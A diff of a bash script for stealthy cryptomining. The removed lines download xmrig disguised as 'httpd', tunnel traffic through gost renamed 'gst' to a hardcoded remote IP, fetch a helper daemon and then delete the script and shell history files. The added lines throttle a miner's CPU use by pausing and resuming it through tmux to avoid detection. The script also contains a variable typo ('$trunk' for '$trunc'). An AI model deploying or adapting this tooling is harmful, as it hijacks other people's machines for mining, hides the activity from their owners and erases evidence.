@@ -1,66 +1,62 @@
-#!/bin/bash
+#!/bin/bash -i
 
-## needed
-apk --no-cache add tmux sed grep 2>/dev/null
-export TERM=${TERM:-linux} PATH=.:$PATH
+## gnu grep and sed required
 
-## glib
-LIBC=2.26-r0
-wget -q -O /etc/apk/keys/sgerrand.rsa.pub https://raw.githubusercontent.com/sgerrand/alpine-pkg-glibc/master/sgerrand.rsa.pub
-wget https://github.com/sgerrand/alpine-pkg-glibc/releases/download/${LIBC}/glibc-${LIBC}.apk
-apk add glibc-${LIBC}.apk 2>/dev/null
-rm -f glibc-${LIBC}.apk
-## tnl
-TNL_REMOTE=${TNL_REMOTE:-212.237.6.194}
-TNL_ARGS=${TNL_ARGS:--L tcp://:8080/:8081 -F kcp://chacha20:123@${TNL_REMOTE}:443?ttl=60}
-TNL_VER=${TNL_VER:-2.4}
-TNL_MASK=${TNL_MASK:-gst}
-TNL_URL=https://github.com/ginuerzh/gost/releases/download/v${TNL_VER}/gost_${TNL_VER}_linux_amd64.tar.gz
-wget -q $TNL_URL -O tnl.tar.gz
-tar xf tnl.tar.gz
-mv gost*/gost ${TNL_MASK} && chmod +x ${TNL_MASK} &>/dev/null
-rm -rf tnl.tar.gz gost*/
-tmux new-session -d -s ${TNL_MASK} ${TNL_MASK} ${TNL_ARGS}
-
-cd ~/ || exit 1
-
-OBJ_MASK=${OBJ_MASK:-httpd}
-DAEMON=${DAEMON:-pausd}
-OBJ_CFG=${OBJ_CFG:-cfg}
-DAEMON_ARGS=${DAEMON_ARGS:-${OBJ_MASK} ${OBJ_CFG}}
-
-## download cfg
-if [ "$OBJ_CFG" != cfg ]; then
-	wget -q "$OBJ_CFG" -O cfg
+if [ -z "$2" ]; then
+    echo "USAGE: pausd [executable] [config]"
+    exit 1
 fi
 
-## object
-OBJ_VER=${OBJ_VER:-2.4.3}
-OBJ_NAME=${OBJ_NAME:-xmrig}
-OBJ_URL=${OBJ_URL:-https://github.com/xmrig/xmrig/releases/download/v${OBJ_VER}/${OBJ_NAME}-${OBJ_VER}-gcc7-xenial-amd64-no-api.tar.gz}
+## number of accepted shares before pause
+shares=${PAUSD_SHARES:-1}
+## process config
+threads=${PAUSD_THREADS:-1}
+ver=${PAUSD_VER:-2}
+[ $threads = 1 ] && ver=2 ## on one process av2 is better
+## tmux session name
+ssn=${PAUSD_SESSION_NAME:-daemon}
 
-## get the object
-wget -q $OBJ_URL -O obj.tar.gz
-tar xf obj.tar.gz
-rm -f obj.tar.gz
-mv ${OBJ_NAME}*/${OBJ_NAME} ${OBJ_MASK}
-rm -rf ${OBJ_NAME}*/
-chmod +x ${OBJ_MASK} &>/dev/null
+## tune the load on the host (TODO normalize rate so it is friendlier)
+## rate=100 means half the available time is used (sleep half the time)
+## rate=200 means 2/3 of the available time (sleep 1/3)
+## rate=50 means 1/3 of the avaialble time (sleep 2/3)
+## rate=1000 means 90/100 of the avaialble time (sleep 1/10)
+rate=${PAUSD_RATE:-40}
 
-## daemon
-DAEMON_URL=https://rawgit.com/untoreh/scripts/master/${DAEMON}
-wget -q ${DAEMON_URL}
-chmod +x ${DAEMON} &>/dev/null
+## start the process
+tmux new-session -d -s $ssn \
+"$1 -c $2 \
+        -v $ver \
+        -t $threads \
+        -l log"
+# pid=$! ## for non tmux
+# pid=$((pid-1)) ## for non zsh
+# [ -z "$pid" ] && echo "process not started" && exit 1
 
-## daemon conf
-PAUSD_SHARES=${PAUSD_SHARES:-1}
-PAUSD_THREADS=${PAUSD_THREADS:-1}
-PAUSD_VER=${PAUSD_VER:-2}
-PAUSD_SESSION_NAME=${PAUSD_SESSION_NAME:-${OBJ_MASK}}
-PAUSD_RATE=${PAUSD_RATE:-200}
+# while [ -n $(pgrep $pid) ]; do ## for non tmux
+while [ -n "$(tmux list-sessions | grep -i $ssn)" ]; do
+    ## read from log file
+    start=$(date +%s)
+    # kill -CONT $pid ## for non tmux
+    tmux send-keys -t $ssn r
+    while true; do
+        accepted=$(grep --binary-files=text accepted log | wc -l)
+        if [ "$accepted" -ge $shares ]; then
+            stop=$(date +%s)
+            # kill -STOP $pid ## for non tmux
+            tmux send-keys -t $ssn p
+            wait=$(( (stop - start) * 100 / rate ))
+            trunc=$(cat log | sed '/accepted/,$d') ## gnu sed
+            echo "$trunk" > log
+            sleep $wait
+            break
+        else
+            sleep 1
+        fi
+    done
+done
 
-## init
-tmux new-session -d -s ${DAEMON} ${DAEMON} ${DAEMON_ARGS}
+exit 1
 
-## cleanup
-rm -- "$0" "$OBJ_CFG" ~/.*_history
+## considerations
+## $wait does not need any rand mangling because the accepted notifications are variable enough
